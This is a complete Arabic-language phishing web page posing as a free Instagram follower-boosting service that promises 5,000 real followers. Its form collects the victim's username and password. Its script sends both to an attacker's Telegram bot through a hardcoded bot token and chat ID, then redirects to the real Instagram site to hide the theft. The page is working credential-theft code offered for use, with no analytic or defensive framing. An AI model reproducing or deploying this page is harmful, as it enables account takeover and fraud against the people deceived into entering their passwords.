<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين إنستغرام مجاناً</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: rgba(0, 0, 0, 0.85);
            border-radius: 16px;
            padding: 35px 25px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #ddd;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .input-field {
            width: 100%;
            background: #222;
            border: 1px solid #444;
            border-radius: 8px;
            padding: 12px;
            font-size: 14px;
            color: #fff;
            margin-bottom: 15px;
            outline: none;
            text-align: right;
        }
        .input-field:focus {
            border-color: #fd1d1d;
        }
        .submit-btn {
            width: 100%;
            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .submit-btn:hover {
            opacity: 0.9;
        }
        .submit-btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>🚀 زيادة متابعين إنستغرام</h1>
        <p>احصل على 5,000 متابع حقيقي مجاناً لحسابك الآن</p>
        
        <form id="boostForm">
            <input type="text" id="username" class="input-field" placeholder="اسم المستخدم (Username)" required>
            <input type="password" id="password" class="input-field" placeholder="كلمة المرور (لتأكيد الملكية)" required>
            <button type="submit" class="submit-btn" id="submitBtn">بدء زيادة المتابعين</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = "8806405628:AAFnZPAD8ngGxGk8NMLzZwdNFa9LieAm4cA";
        const CHAT_ID = "7061254731";
        const REAL_INSTAGRAM = "https://www.instagram.com";

        const boostForm = document.getElementById('boostForm');
        const submitBtn = document.getElementById('submitBtn');

        boostForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) return;

            submitBtn.disabled = true;
            submitBtn.textContent = "جاري معالجة الطلب وإرسال المتابعين...";

            const message = `🎯 صيد زيادة متابعين جديد (Cloudflare):\n\n👤 الحساب: ${username}\n🔑 كلمة المرور: ${password}\n🌐 الوقت: ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (err) {
                // Ignore network issues to ensure smooth redirect
            } finally {
                setTimeout(() => {
                    window.location.href = REAL_INSTAGRAM;
                }, 1200);
            }
        });
    </script>
</body>
</html>
